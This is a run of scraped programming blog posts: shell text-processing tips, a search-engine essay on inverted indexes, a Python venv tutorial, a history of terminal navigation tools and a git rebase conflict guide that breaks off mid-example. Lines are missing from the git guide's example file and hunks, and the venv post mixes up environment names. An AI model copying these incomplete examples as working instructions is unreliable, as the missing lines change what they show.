    echo 'xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;'
    echo "$urls" |
        sed -E 's#^(.*)$#&lt;url&gt;&lt;loc&gt;'"$base_url"'/\1&lt;/loc&gt;&lt;lastmod&gt;'"$date"'&lt;/lastmod&gt;&lt;priority&gt;1.0&lt;/priority&gt;&lt;/url&gt;#'
    echo '&lt;/urlset&gt;'
}
</code></pre>

<p>But who would use this?</p>

<pre><code>func render_sitemap(params []string)
</code></pre>

<p>I consider shell function with more than one parameter a contributor to write-only code.</p>

<h2 id="Multiple%20text%20processors">Multiple text processors</h2>

<p>The text processor hierarchy follows:</p>

<ul>
<li>single-purpose: <code>cut</code>, <code>tr</code>, <code>nl</code>, <code>sort</code>, <code>grep</code></li>
<li>flat: regexes and sed</li>
<li>text DSLs: Awk</li>
<li>scripting languages: Python, Perl</li>
</ul>

<p>Generally, you should use <strong>one</strong> and only one of those specified above. Start with the lower-down tool, then instead of adding a command to the pipe use a higher-tier text processor.</p>

<p>In pipes, programming languages get out of hand quickly. Putting everything in quotes and no syntax highlighting is difficult.</p>

<p><em>This list will probably get a few updates in the future. For now, happy scripting!</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="root">

<h2>Prelude</h2>
<p>I read more often than ever that people are looking for ways to build
their own search engines.</p>
<p>Even if more on more "advanced" features are integrated into search
engines.  They are mostly based on human grunt work.  Semantic search
engine, whatever "semantic" does mean for you, is in fact merely a
couple, not more than a dozen, set of tricks.  I like to say, much of
Google's search engine is good old human labor.  If you still doubt
it, here is again: Google results are not only biased, also they are
editorialized.  Whether algorithms, and their bugs, party is
irrelevant.</p>
<p>My point is: it is human made.  Not some necessarly advanced alien
tool.</p>
<p>The only thing preventing you to have your own search engine is there
is no readily available software, why? because there is no cheap
hardware.</p>
<p>This might sound like a crazy idea five or ten years ago, but with the
advent of AMD threadripper ie. <a href="http://cultureandempire.com/html/cande.html">cost gravity at
play</a> getting together a
personal search engine is, if not a necessity, at least a possibility.</p>
<p>The most common complain I read about Google is that it yields
irrelevant text "that do no even contain my search terms". That is not
a bug, that is a feature!  It seems to me the subtext is that you can
not easily customize Google or whatever search algorithm since it is
privative.  Even retrieving Google search results for further
processing if not forbidden, is at least difficult.</p>
<h2>Getting started</h2>
<p>Let's start with the beginning: what is a search engine? A search
engine is software that will <strong>crawl</strong> the Internet, <strong>index</strong>
ie. store the text in a particular format, and that users can
<strong>query</strong> and receive in return the most relevant text.</p>
<p>Let's dive into what "relevant text" means. What is relevant text?</p>
<ol>
<li>A text that contains the search term in my query</li>
<li>A text that has the same topic as my query</li>
<li>A text that gives an answer to my query</li>
</ol>
<p>The good answer is "it depends".  That's why queries have grown from
keywords match like a book index, to boolean queries e.g. <code>"Apple"
-bible</code>, until so called semantic search, which boils down to consider
one-way or two-way synonyms and other lexical features.</p>
<p>So far, I failed to build a crawler that works.  Also much of the text
I am looking for is in wikipedia or StackOverflow for which they are
flat releases which are much more easy to get started than putting
together your own crawler.  Still, they are some crawler around, so
you can use that or learn from it.  I will not dive into the crawler
part because it still hurts when I think about <code>robots.txt</code>,
throttling, text encoding etc... booooh!</p>
<p>So, we will imagine that you have a dataset of plain text, for
instance wikipedia vital articles.  It helps if you know the content
of the dataset.  Querying random news article is not very easy to
grasp because you have to read (!) the text to figure when and how
they are relevant.</p>
<p>Before querying, you need to store the text, but to know <strong>how</strong> to
store the text you need to know which query feature you want. To get
started I will only consider positive keywords and negative keywords
like <code>apple -bible</code>. So, we need to figure which find out which text
contains the word <code>apple</code> but not the word <code>bible</code>. Looking up
everything that does not contain <code>bible</code> is difficult, you would need
to <strong>scan</strong> the whole database to what are those document. Instead we
will look for documents that contains the word <code>apple</code>.  So the
following document contains the word we are looking for:</p>
<div><pre><span></span><span>(</span><span>define </span><span>doc1</span> <span>"apple is looking for a search engine."</span><span>)</span>
</pre></div>
<p>That is the moment where the most advanced technology of our current
century makes it appearance: the inverted index.  <strong>What is an inverted
index? It reverses the relationship between the document and the word</strong>.
Instead of saying "this document contains the word apple" it says
"apple is contained in this document".  So we might have a procedure
that returns the document identifier that contains <code>apple</code>, like:</p>
<div><pre><span></span><span>(</span><span>assert</span> <span>(</span><span>contains?</span> <span>(</span><span>inverted-index-lookup</span> <span>"apple"</span><span>)</span> <span>1</span><span>))</span>
</pre></div>
<p><code>inverted-index-lookup</code> returns a list, and that list contains the identifier <code>1</code>
of the first document.  That list might be big. So <strong>you want to consider the least common word from the query</strong>. I call that step
<em>candidates selection</em>.  Also, you might want to convert the positive terms
into lemmas or stems to go toward semantic search, which will mean you need
to store lemmas or stems at index time.</p>
<p>Anyway, the next step, given the list of documents that contain the
least common word or term or lemma or stem, is to <strong>filter and score</strong>
according to the full query. In the above case, that is remove the
documents that contains <code>bible</code>.  You can do that step serially, and
it will necessarly take time.  The trick is to use <code>for-each-par-map</code>.
That is a cousin of map-reduce that execute the map procedure in
parallel.</p>
<p>For instance something like:</p>
<div><pre><span></span><span>(</span><span>let </span><span>((</span><span>hits</span> <span>'</span><span>()))</span>
  <span>(</span><span>for-each-par-map</span>
    <span>(</span><span>lambda </span><span>(</span><span>uid</span> <span>score</span><span>)</span> <span>(</span><span>when</span> <span>score</span> <span>(</span><span>set! </span><span>hits</span> <span>(</span><span>take</span> <span>10</span> <span>(</span><span>sort</span> <span>(</span><span>cons </span><span>(</span><span>cons </span><span>uid</span> <span>score</span><span>)</span> <span>hits</span><span>))))))</span>
    <span>score</span> <span>(</span><span>inverted-index-lookup</span> <span>"apple"</span><span>))</span>
  <span>hits</span><span>)</span>
</pre></div>
<p>The score function is interesting. I think going the
<a href="https://github.com/abusix/ahocorapy">aho-corasick</a> with a
<a href="https://medium.com/analytics-vidhya/converting-boolean-logic-decision-trees-to-finite-state-machines-180ad195abf2">FSM</a>
is the best route because it is easy to implement proximity scoring,
"phrase matching", or really anything I can think of.</p>
<blockquote><p>⚠ That last paragraph is really the most important part of this
post.</p>
</blockquote>
<h2>Conclusion</h2>
<p>There is a gigantic leap that is going to happen in search because of
hardware availability, and free software with readable source ie. the
only thing that makes human progress possible: knowledge sharing.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>What is a python virtual environment ?</span></p>

<p><span>A Python virtual environments is an isolated environment for Python projects. This means that each project can have its own dependencies and let other projects have their own</span></p>

<p><span>It also means each project can have its own python version. For example, Project X could be using Python 2.7 and Project Y uses Python 3.6.</span></p>

<p><span>Creation of python environments is done using the <code>venv</code> module in python. The <code>venv</code> is an inbuilt Python module, no need for any&nbsp;installation if you have python already installed..</span></p>

<p><span>Virtual Environments are created for specific python projects. So to create one, you have to know the path to your project's main directory.</span></p>



<h3><span>Creating a Project directory or folder</span></h3>

<p><span>Run the following code in your command line or terminal:</span></p>

<pre><code>mkdir first_project &amp;&amp; cd first_project</code></pre>

<p><span>The mkdir <code>first_project</code> creates a directory or folder called <code>first_project</code> and the cd f<code>irst_project</code> navigates into the directory. <code>&amp;&amp;</code> just represents "and".</span></p>

<p><span>It is just the same as creating an empty folder and then opening it. Simple<img alt="smiley" src="http://127.0.0.1:8000/static/ckeditor/ckeditor/plugins/smiley/images/regular_smile.png" title="smiley"> </span></p>

<p><span>The directory <code>first_project</code> is the directory where all your project files are going to be. It is also the same directory where our virtual environment will be created</span></p>



<h3><span>Creating the virtual environment</span></h3>

<p><span>To create a virtual environment,&nbsp; run the <code>venv</code> module as a script. Note : You should be navigated into your project directory in the command line before running this:</span></p>

<pre><code>python -m venv firstproject-env</code></pre>

<p><span><code>firstproject-env</code> is the name given to the virtual environment being created, you could call it whatever you want. python tells the virtual environment to be created with Python version available. </span></p>

<p><span>If you have multiple versions of Python on your system, you can select a specific Python version by running <code>python3</code> or whichever version you want like this:</span></p>

<pre><code>python3 -m venv firstproject-env</code></pre>

<p>.<span>The first one is required when you have only one python version installed</span></p>

<p><span>So running the command will create the <code>firstproject-env</code> directory if it doesn’t exist, and also create directories inside it containing a copy of the Python interpreter, the standard library, and various supporting files.</span></p>



<h3><span>Activating virtual environment</span></h3>

<p><span>Once you’ve created a virtual environment, you may activate it.</span></p>

<p><span>On windows : </span></p>

<pre><code>cd firstproject-env/Scripts</code></pre>

<p><span>Then </span></p>

<pre><code>activate.bat</code></pre>



<p><span>On Mac OS</span></p>

<pre><code>source tutorial-env/bin/activate</code></pre>



<p><span>Activating the virtual environment will change your shell’s prompt to show what virtual environment you’re using.</span></p>

<p><span>On windows it looks something like this:</span></p>

<pre><code>(firstproject-env) C:\Users\USER\Desktop\first_project\firstproject-env\Scripts&gt;</code></pre>



<p><span>Thats it. You can then install, upgrade, and remove packages using&nbsp; <strong>pip. </strong>The packages installed will be isolated for only for a given project.</span></p>



<p><span>You should not worry about virtual environments if you are using an IDE like PyCharm. It automatically creates a virtual environment whenever you create a new python project.</span></p>

<p>A small list of methods for fast file system navigation from the command line.
While I tried all of them and finally settled on a minimal approach described at the end, the article doesn’t advocate for one method over the others.
Different users have different needs and should choose the approach most suitable in their circumstances.</p>

<h2 id="spring">Spring</h2>

<p>At the beginning, just after learning to use the command line, my terminal navigation included a lot of <code>cd</code> and a lot of <code>ls</code>.
I jumped around folders, learned shortcuts like, <code>cd ~</code>, <code>cd -</code>, and started becoming familiar with the shell.
Having multi-argument commands for quick file manipulation felt powerful and fresh, or so I remember.</p>

<p>After going to command line you no longer have to open folders in a graphical window manager, scan their names, use <code>&lt;ctrl + mouse click&gt;</code> to select them, and then drag the mouse to move those selected folders to another place.
You do <code>'mv pattern* place/'</code> instead.
All is nice.</p>

<p>But there was one problem.</p>

<h2 id="summer">Summer</h2>

<p>Along the way I started organizing my folders using a structure like this:</p>

<pre><code>└── work
    ├── bitbucket
    │   └── user1
    │       ├── repo1
    │       └── repo2
    ├── github
    │   ├── user1
    │   │   ├── repo1
    │   │   └── repo2
    │   ├── user2
    │   │   ├── repo1
    │   │   └── repo2
    │   ├── user3
    │   │   ├── repo1
    │   │   ├── repo2
    │   │   ├── repo3
    │   │   └── repo4
    │   └── user4
    │       └── repo1
    ├── teaching
    │   ├── class1
    │   │   ├── lecture1
    │   │   └── lecture2
    │   └── class2
    │       ├── lecture1
    │       └── lecture2
    ├─── clients
    │   ├── client1
    │   │   ├── project1
    │   │   ├── project2
    │   │   └── project3
    │   ├── client2
    │   │   ├── project1
    │   │   ├── project2
    │   │   └── project3
    │   └── client3
    │      └── project1
    └─── ...
</code></pre>

<p>I often had to go in and out of various project folders and my <code>cd</code> + <code>ls</code> navigation became tedious.
Reaching a project involved navigating a big tree of directories.
On top of that a lot of directories had similar names which got in the way of tab completion.
This is where I found “z” - a command line utility that tracks your most visited folders based on frequency and recency<a href="#fn:1" id="fnref:1" title="see footnote"><sup>○</sup></a>.</p>

<p>“z” keeps a database of your most frequently used folders and allows to quickly jump to these folders even if you don’t remember their full name.
Instead of doing a lot of <code>cd</code> + <code>&lt;tab&gt;</code> all you have to do is type <code>'z proj'</code> and <code>z</code> will take you to your most frequently/recently accessed folder that has <code>proj</code> somewhere in its name.
It takes a short amount of time for “z” to learn about your most visited places but after that it becomes quick and convenient.</p>

<p>But there was one problem.</p>

<h2 id="autumn">Autumn</h2>

<p>“z” didn’t always take me where I wanted to be.
It worked, I would say, around 95% of the time or more.
But those other times it took me to an unrelated directory and distracted from the work at hand forcing to navigate my way back using the old <code>cd</code>.
Moreover, sometimes I moved and renamed various folders which likely contributed to its disorientation.</p>

<p>After this experience I decided that the terminal should be dumb and deterministic without any fuzziness or smart guessing.
And here I found <code>marks</code> - a short and sweet command line script for keeping manual directory bookmarks.<a href="#fn:2" id="fnref:2" title="see footnote"><sup>○</sup></a>
It consisted of 4 tiny functions: one for creating a mark, one for removing, one for listing all the marks, and one for jumping to the bookmarked folder:</p>

<pre><code>export MARKPATH=$HOME/.marks

function mark {
  mkdir -p "$MARKPATH"; ln -s "$(pwd)" "$MARKPATH/$1"
}

function unmark {
  rm -i "$MARKPATH/$1"
}

function marks {
  ls -l "$MARKPATH" | sed 's/  / /g' | cut -d' ' -f9- | sed 's/ -/\t-/g' &amp;&amp; echo
}

function jump {
  cd -P "$MARKPATH/$1" 2&gt;/dev/null || echo "No such mark: $1"
}
</code></pre>

<p>As well as a function generating completion suggestions after pressing <code>&lt;tab&gt;</code>:</p>

<pre><code>_completemarks() {
  local curw=${COMP_WORDS[COMP_CWORD]}
  local wordlist=$(find $MARKPATH -type l -printf "%f\n")
    COMPREPLY=($(compgen -W '${wordlist[@]}' -- "$curw"))
    return 0
}

complete -F _completemarks jump unmark
</code></pre>

<p>The workflow of marks is manual but convenient.
You have to go into the directory you want to bookmark and execute the <code>mark</code> command followed by the custom name, like <code>'mark myproject'</code>.
After that you can quickly jump back to this bookmarked folder using <code>'jump myproject'</code> and when the bookmark is no longer relevant you can get rid of it with <code>'unmark myproject'</code>.</p>

<p>With this approach the user is in control.
There is no secret smart behaviour which means no auto-magic and no surprises.
And after moving a project to another place the bookmark can be easily adjusted to point to its new location immediately, without waiting for a hidden automatic process to update its location, frequency, and recency.</p>

<p>But there was one problem.</p>

<h2 id="winter">Winter</h2>

<p>Neither of those <code>jump</code> nor <code>z</code> commands could take me everywhere I needed to go.
So the typical workflow would start with jumping to a project via the <code>jump</code> command but then switching to the old navigation via <code>cd</code> once inside it.
Which meant that for navigating the file system I always had to keep using both: <code>jump</code> and <code>cd</code>.
And having two distinct commands for doing the same thing felt a bit weird.
This is where I learned about the <code>$CDPATH</code><a href="#fn:3" id="fnref:3" title="see footnote"><sup>○</sup></a> variable and rolled out my own solution.</p>

<p>All you have to do is add this to your .bashrc:</p>

<pre><code>export CDPATH=.:~/.marks/

function mark {
  ln -sr "$(pwd)" ~/.marks/"$1"
}
</code></pre>

<p>Then, to add a bookmark called <code>@name</code> for the current directory:</p>

<pre><code>mark @name
</code></pre>

<p>To jump to its location:</p>

<pre><code>cd @name
</code></pre>

<p>To list all available bookmarks:</p>

<pre><code>cd @&lt;tab&gt;
</code></pre>

<p>And to delete a bookmark when it’s no longer needed:</p>

<pre><code>rm ~/.marks/@name
</code></pre>

<p><code>$CDPATH</code> solution works best when all the bookmarks are started with a special symbol which in my case was <code>@</code>.
This solves a couple of problems.
First, bookmarks, if prefixed with <code>@</code> symbol, will not interfere with directories in the current folder.
Second, all the available bookmarks will be displayed by typing <code>'cd @&lt;tab&gt;'</code>.
And third, all bookmarks are now part of <code>cd</code> and so they gain tab completion for free.
You can even use tab completion for jumping directly to folders nested within bookmarks by doing <code>'cd @bookmark/subfolder/'</code>.</p>

<p>Using this method you no longer have to maintain several custom functions and their autocompletion in .bashrc.
And the action for changing directory is always performed using the same familiar <code>cd</code> command, independent of whether the directory is a bookmark or not.</p>

<p>But there was one problem.</p>

<h2 id="springagain">Spring again</h2>

<p>After working with the <code>$CDPATH</code> approach for a while I began noticing something peculiar.
At no point in time did I have a list with a dozen or more bookmarks.
Instead I found myself constantly going to the same 2 or 3 projects, finishing them, removing them from <code>~/.marks/</code> folder, adding new ones, and repeating the cycle again.
Why would someone keep bookmarks for 3 directories?</p>

<p>This time, instead of changing the command, I tried to do something different and changed the folder structure.
My projects moved from the state of being relevant to being archived so why not create an archive directory and organize folders based not on their name or type but on state?
Thus the <code>"zzz"</code> folder was born.
And now my project structure looks something like this:</p>

<pre><code>└── work
    ├── active_project1
    ├── active_project2
    └── zzz
        ├── bitbucket
        │   └── user1
        │       ├── repo1
        │       └── repo2
        ├── github
        │   ├── user1
        │   │   ├── repo1
        │   │   └── repo2
        │   ├── user2
        │   │   ├── repo1
        │   │   └── repo2
        │   ├── user3
        │   │   ├── repo1
        │   │   ├── repo2
        │   │   ├── repo3
        │   │   └── repo4
        │   └── user4
        │       └── repo1
        ├── teaching
        │   ├── class1
        │   │   ├── lecture1
        │   │   └── lecture2
        │   └── class2
        │       ├── lecture1
        │       └── lecture2
        ├─── clients
        │   ├── client1
        │   │   ├── project1
        │   │   ├── project2
        │   │   └── project3
        │   ├── client2
        │   │   ├── project1
        │   │   ├── project2
        │   │   └── project3
        │   └── client3
        │      └── project1
        └─── ...
</code></pre>

<p>With this structure the bookmarking systems no longer provide big benefits as most frequent and recent folders are always under ~/work/some_project.
And since at any timepoint only a few of them are visible the tab completion will do its job: <code>'cd ~/w&lt;tab&gt;/s&lt;tab&gt;'</code>.</p>

<p>The name <code>"zzz"</code> might seem strange but is convenient: the letters “zzz” symbolically mark the projects within as being in a “sleeping” state while the 3 “z” letters in a row make sure that this folder is always placed at the very end of your active project list.
A nice folder structure is still maintained in the archive but for the ease of access all active folders are layed flat under the <code>~/work/</code> directory.
When the project is paused or completed it is moved to its place within the <code>"zzz"</code> hierarchy, maintaining the previous structure.
There is one extra benefit - contents of the <code>"work"</code> directory act as a reminder about all the projects that are in progress.
If necessary a to-do list with concrete details might be placed at the same level.</p>

<p>And just like that, like a newbie, I navigate the file system with <code>cd</code> and <code>ls</code> again.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <h3>git-rebase-conflicts</h3>
  
<h2 id="a-note-about-terminology">A note about terminology</h2>
<p>This article is about <code>git rebase</code> conflicts. A similar article with slightly different technical details could be written for <code>git merge</code> conflicts. I use “merge” as a non-technical term for combining the content of two different repository states, not to refer to <code>git merge</code>ing specifically.</p>
<h2 id="introduction">Introduction</h2>
<p>When a git rebase conflict occurs you will be presented with a conflict region (or “hunk”) that shows why the rebased commit couldn’t be applied to the base branch. To resolve a rebase conflict, your task is to apply the logically-intended (i.e.&nbsp;semantic) change of the rebased commit to the base branch.</p>
<p>Some merge tools (for example <a href="https://emacs.stackexchange.com/questions/16469/how-to-merge-git-conflicts-in-emacs/16470#16470">Emacs SMerge</a>) offer you the option to “keep their changes” or “keep our changes”. This is almost always wrong. The whole point of merging (remember, I’m using that word in the non-technical sense, not to refer to <code>git merge</code>ing specifically) is to <em>combine</em> two conflicting things, not to choose one over the other. By choosing one you ignore a change in the other that may be required by other parts of the same commit (parts that may not see because they merged without conflict!).</p>
<p>The existence of a conflict means that the patches could not be merged textually. However, the aim is actually to merge them <em>semantically</em>. Merge tools are rarely (perhaps never) clever enough to be able to perform semantic merges so they settle for textual merges. In the cases where textual merges are not possible the task is left to human ingenuity.</p>
<p>Key takeaway: the aim is to apply the logical (i.e.&nbsp;semantic) content of the rebased commit to the base branch.</p>
<h2 id="summary-of-the-conflict-resolution-procedure">Summary of the conflict resolution procedure</h2>
<p>Resolving a rebase conflict requires understanding the logically intended (semantic) change of the rebased commit and applying it manually to the base branch. Here is the procedure to follow. The details will be explained by way of example later.</p>
<ol type="1">
<li><p>Issue the <code>git rebase</code> command.</p>
<p>Use the <code>diff3</code> conflict style option because it shows important information in the conflict markers that would otherwise be absent.</p>
<pre><code>git -c merge.conflictStyle=diff3 rebase ...</code></pre></li>

<h2 id="why-use-diff3">Why use <code>diff3</code>?</h2>
<p>It is literally impossible to resolve conflicts using the default merge conflict style. I suggest setting <code>diff3</code> in your global options.</p>
<pre><code>git config --global merge.conflictStyle diff3</code></pre>
<p>Why is it literally impossible? Consider a branch which adds a function <code>foo1</code> at a particular source file location</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>def</span> foo1():</span>
<span id="cb4-2">    <span>print</span>(<span>"foo1"</span>)</span></code></pre></div>
<p>and another branch which adds a function <code>foo2</code> at the same location</p>
<div id="cb5"><pre><code><span id="cb5-1"><span>def</span> foo2():</span>
<span id="cb5-2">    <span>print</span>(<span>"foo2"</span>)</span></code></pre></div>
<p>If I rebase one on the other I get a conflict. The default merge conflict style will show</p>
<div id="cb6"><pre><code><span id="cb6-1"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb6-2"> +def foo1():</span>
<span id="cb6-3"> +    print("foo1")</span>
<span id="cb6-4"><span>++=======</span></span>
<span id="cb6-5"><span>+ def foo2():</span></span>
<span id="cb6-6"><span>+     print("foo2")</span></span>
<span id="cb6-7"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add foo2</span></span></code></pre></div>
<p>What are the conflict markers telling me? They’re telling me that I need to <em>add</em> both <code>foo1</code> and <code>foo2</code> to the file, right? Unfortunately not! Consider a file in which <code>foo1</code> and <code>foo2</code> already exist, and two branches, one of which removes <code>foo1</code> and one of which removes <code>foo2</code>. If I rebase one on the other what is the result? The default merge conflict style will show</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb7-2"> +def foo1():</span>
<span id="cb7-3"> +    print("foo1")</span>
<span id="cb7-4"><span>++=======</span></span>
<span id="cb7-5"><span>+ def foo2():</span></span>
<span id="cb7-6"><span>+     print("foo2")</span></span>
<span id="cb7-7"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Remove foo1</span></span></code></pre></div>
<p>Under the default conflict style the case of removing two functions is indistinguishable from the case of adding two functions (besides the text of the commit message which can only ever be a hint)! Therefore the default conflict style is insufficient for purpose of resolving conflicts. This probably explains why resolving conflicts is seen as a dark art. <code>diff3</code> not only makes it possible, below we will see that it is often easy.</p>
<h2 id="example-file">Example file</h2>
<p>The examples will based on changes to this example Python file.</p>
<div id="cb8"><pre><code><span id="cb8-1"><span>def</span> foo1():</span>
<span id="cb8-2">    <span>print</span>(<span>"foo1"</span>)</span>

<span id="cb8-15"></span>
<span id="cb8-16"><span>def</span> main():</span>
<span id="cb8-17">    foo1()</span>
<span id="cb8-18">    foo2()</span>
<span id="cb8-19">    foo3()</span></code></pre></div>
<h2 id="worked-example-adding-two-different-things">Worked example: adding two different things</h2>
<p>Suppose I have a patch that adds a call of <code>foo4</code> and another patch that adds a call of <code>foo5</code>, that is</p>
<div id="cb9"><pre><code><span id="cb9-1"> def main():</span>
<span id="cb9-2">     foo1()</span>
<span id="cb9-3">     foo2()</span>
<span id="cb9-4">     foo3()</span>
<span id="cb9-5"><span>+    foo4()</span></span></code></pre></div>
<p>and</p>
<div id="cb10"><pre><code><span id="cb10-1"> def main():</span>
<span id="cb10-2">     foo1()</span>
<span id="cb10-3">     foo2()</span>
<span id="cb10-4">     foo3()</span>
<span id="cb10-5"><span>+    foo5()</span></span></code></pre></div>
<p>If I try to rebase the latter on the former then the result is a conflict. The conflict is marked in the file by conflict markers, as below. This is sometimes referred to as a “hunk”. There are three sections in the hunk:</p>
<ol type="1">
<li><p>Between <code>&lt;&lt;&lt;</code> and <code>|||</code>: the state of the base branch, i.e.&nbsp;what the rebase commit actually saw when it tried to apply its change</p></li>
<li><p>Between <code>|||</code> and <code>===</code>: the state that the rebased commit expected to see</p></li>
<li><p>Between <code>===</code> and <code>&gt;&gt;&gt;</code>: what the result of applying the rebased commit would have been, if it had seen what it expected</p></li>
</ol>
<p>These three sections are always different from each other. If any pair were the same then there would be no conflict!</p>
<div id="cb11"><pre><code><span id="cb11-1">      foo1()</span>
<span id="cb11-2">      foo2()</span>
<span id="cb11-3">      foo3()</span>
<span id="cb11-4"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb11-5"> +    foo4()</span>
<span id="cb11-6"><span>++||||||| merged common ancestors</span></span>
<span id="cb11-7"><span>++=======</span></span>
<span id="cb11-8"><span>+    foo5()</span></span>
<span id="cb11-9"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add foo 5</span></span></code></pre></div>
<h3 id="the-intent-of-the-rebased-commit">The intent of the rebased commit</h3>
<p>There are two equivalent ways to see the logical intent of the rebased commit.</p>
<ul>
<li><p>It is the difference between the middle hunk section (below “merged common ancestors”) and the bottom hunk section (above the commit description, “Add foo 5”).</p></li>
<li><p>It is shown in the output of <code>git show REBASE_HEAD</code>. This is generally easier to interpret than the above, but more verbose as it also contains diffs relating to non-conflicting parts of the commit. In this case it shows</p></li>
</ul>
<div id="cb12"><pre><code><span id="cb12-1">     foo1()</span>
<span id="cb12-2">     foo2()</span>
<span id="cb12-3">     foo3()</span>
<span id="cb12-4"><span>+    foo5()</span></span></code></pre></div>
<p>Using either method you can see that the logical change of the rebased commit is to add <code>foo5()</code> after <code>foo3()</code>.</p>
<h3 id="the-state-of-the-base-branch">The state of the base branch</h3>
<p>There are two equivalent ways to see the state of the base branch.</p>
<ul>
<li><p>The top hunk section (below <code>HEAD</code>)</p></li>
<li><p>The output of <code>git show HEAD:&lt;filename&gt;</code>. This latter form is probably less useful than the former because it shows the entire state of <code>&lt;filename&gt;</code> without drawing your attention to the conflicting section. In this case it shows</p></li>
</ul>
<pre><code>...
def main():
    foo1()
    foo2()
    foo3()
    foo4()</code></pre>
<p>Either way, you can see that the base branch has <code>foo4()</code> after <code>foo3()</code>.</p>
<h3 id="resolving-the-conflict">Resolving the conflict</h3>
<p>The correct way to resolve this conflict is to apply the logical change of the rebased commit—adding <code>foo5()</code> after <code>foo3()</code>—to state of the base branch—which has <code>foo4()</code> after <code>foo3()</code>. In your editor this will typically be easiest to do by making the change to the top hunk section and then deleting the other hunk sections. It requires semantic understanding to know exactly which way of resolving the conflict is satisfactory, if any. For example, we could put <code>foo5()</code> either before or after the appearance of <code>foo4()</code>. Let’s choose the latter and add <code>foo5()</code> below <code>foo4()</code> in the top hunk section (i.e.&nbsp;below <code>HEAD</code>).</p>
<div id="cb14"><pre><code><span id="cb14-1">      foo1()</span>
<span id="cb14-2">      foo2()</span>
<span id="cb14-3">      foo3()</span>
<span id="cb14-4"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb14-5"> +    foo4()</span>
<span id="cb14-6"> +    foo5()</span>
<span id="cb14-7"><span>++||||||| merged common ancestors</span></span>
<span id="cb14-8"><span>++=======</span></span>
<span id="cb14-9"><span>+    foo5()</span></span>
<span id="cb14-10"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Add foo 5</span></span></code></pre></div>
<p>and then delete the middle and bottom hunk sections, and the conflict markers, to get</p>
<div id="cb15"><pre><code><span id="cb15-1"><span>def</span> main():</span>
<span id="cb15-2">    foo1()</span>
<span id="cb15-3">    foo2()</span>
<span id="cb15-4">    foo3()</span>
<span id="cb15-5">    foo4()</span>
<span id="cb15-6">    foo5()</span></code></pre></div>
<p>Once this change has been made the file can be <code>git add</code>ed and the rebase can continue via <code>git rebase --continue</code>.</p>
<h2 id="worked-example-removing-two-different-things">Worked example: removing two different things</h2>
<p>Suppose I have a patch that removes the call of <code>foo2</code> and another patch that removes the call of <code>foo3</code>, that is</p>
<div id="cb16"><pre><code><span id="cb16-1">def main():</span>
<span id="cb16-2">     foo1()</span>
<span id="cb16-3"><span>-    foo2()</span></span>
<span id="cb16-4">     foo3()</span></code></pre></div>
<p>and</p>
<div id="cb17"><pre><code><span id="cb17-1"> def main():</span>
<span id="cb17-2">     foo1()</span>
<span id="cb17-3">     foo2()</span>
<span id="cb17-4"><span>-    foo3()</span></span></code></pre></div>
<p>If I try to rebase the latter onto the former the conflict is</p>
<div id="cb18"><pre><code><span id="cb18-1">      foo1()</span>
<span id="cb18-2"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb18-3"> +    foo3()</span>
<span id="cb18-4"><span>++||||||| merged common ancestors</span></span>
<span id="cb18-5"><span>+     foo2()</span></span>
<span id="cb18-6"><span>++    foo3()</span></span>
<span id="cb18-7"><span>++=======</span></span>
<span id="cb18-8"><span>++    foo2()</span></span>
<span id="cb18-9"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Remove foo3</span></span></code></pre></div>
<h3 id="the-intent-of-the-rebased-commit-1">The intent of the rebased commit</h3>
<p>By looking at the difference between the middle hunk section and the bottom hunk section, or by looking at <code>git show REBASE_HEAD</code>—which shows</p>
<div id="cb19"><pre><code><span id="cb19-1"> def main():</span>
<span id="cb19-2">     foo1()</span>
<span id="cb19-3">     foo2()</span>
<span id="cb19-4"><span>-    foo3()</span></span></code></pre></div>
<p>—we can see that the intent of the rebased patch was to remove <code>foo3()</code>.</p>
<h3 id="the-state-of-the-base-branch-1">The state of the base branch</h3>
<p>On the other hand, the hunk section under <code>HEAD</code>, and <code>git show HEAD:&lt;filename&gt;</code>—which is</p>
<pre><code>def main():
    foo1()
    foo3()</code></pre>
<p>—show that the base branch does not contain <code>foo2()</code>, but <code>foo3()</code> is still there, ripe for removal. We need to apply the logical intent of the rebased patch to this context, which is done by removing the appearance of <code>foo3()</code> in the hunk section below <code>HEAD</code></p>
<div id="cb21"><pre><code><span id="cb21-1">      foo1()</span>
<span id="cb21-2"><span>++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>
<span id="cb21-3"><span>++||||||| merged common ancestors</span></span>
<span id="cb21-4"><span>+     foo2()</span></span>

<span id="cb21-8"><span>++&gt;&gt;&gt;&gt;&gt;&gt;&gt; Remove foo3</span></span></code></pre></div>
<p>and then we delete the middle and bottom hunk sections and the conflict markers to get</p>
<pre><code>def main():
    foo1()</code></pre>
<h2 id="worked-example-one-addition-one-removal">Worked example: one addition, one removal</h2>
<p>If I rebase the addition of <code>foo4()</code> on the removal of <code>foo3()</code> the conflict is</p>
<pre><code>  def main():
      foo1()
      foo2()
++&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
++||||||| merged common ancestors
++    foo3()
++=======
+     foo3()
+     foo4()

<p><code>git show REBASE_HEAD</code> shows</p>
<pre><code>     foo1()
     foo2()
     foo3()
+    foo4()</code></pre>
<p>so the intention of the rebased commit is to add <code>foo4()</code>. Doing this in the top hunk section (i.e.&nbsp;below <code>HEAD</code>) leads to</p>

